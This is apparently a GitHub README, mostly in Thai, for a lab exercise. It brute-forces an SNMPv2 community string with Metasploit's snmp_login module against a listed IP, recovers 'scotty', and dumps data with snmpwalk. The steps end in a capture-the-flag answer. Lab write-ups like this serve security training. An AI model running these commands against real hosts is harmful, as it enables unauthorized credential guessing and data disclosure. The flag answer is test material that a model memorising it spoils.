# Brute-force-SNMP
การหัดดึงข้อมูลจาก SNMPv2 service โดยต่อเนื่องจาก lab SNMP ซึ่งในที่นี้ทาง SNMP Service ได้เปลี่ยน community string เป็นอย่างอื่นที่ไม่ใช่ default แล้ว ดังนั้นเราจึงจะทำการ brute force เพื่อหา community string ที่ถูกต้อง

How to :

1.msfconsole

2.msf 6 > search snmp_login

3.msf 6 > use auxiliary/scanner/snmp/snmp_login 

![image](https://github.com/thanawut2903/Brute-force-SNMP/assets/159118913/c79af911-f05b-4a3d-abed-8240b57e0d9e)

4.msf 6 > show options

![image](https://github.com/thanawut2903/Brute-force-SNMP/assets/159118913/541dcdda-2d8f-4b67-afc1-6f86beb1762b)

5.msf 6 > set RHOSTS 149.28.159.195 (traget ip)

6.msf 6 > set RPORT 162 (target port)

7.msf 6 > set threads 20

8.msf 6 > run

![image](https://github.com/thanawut2903/Brute-force-SNMP/assets/159118913/683fae60-4203-4411-831d-f0fec32662dc)

 community string = scotty

 9. snmpwalk -v 2c -c ( community string) (target ip):(target port)

snmpwalk -v 2c -c scotty 149.28.159.195:162


![image](https://github.com/thanawut2903/Brute-force-SNMP/assets/159118913/f3d987dc-bd5d-4573-841c-0516b3626245)

Ans : recon{X28QHB2MljB1x24WkMEh1Tl5Xc3q}


 
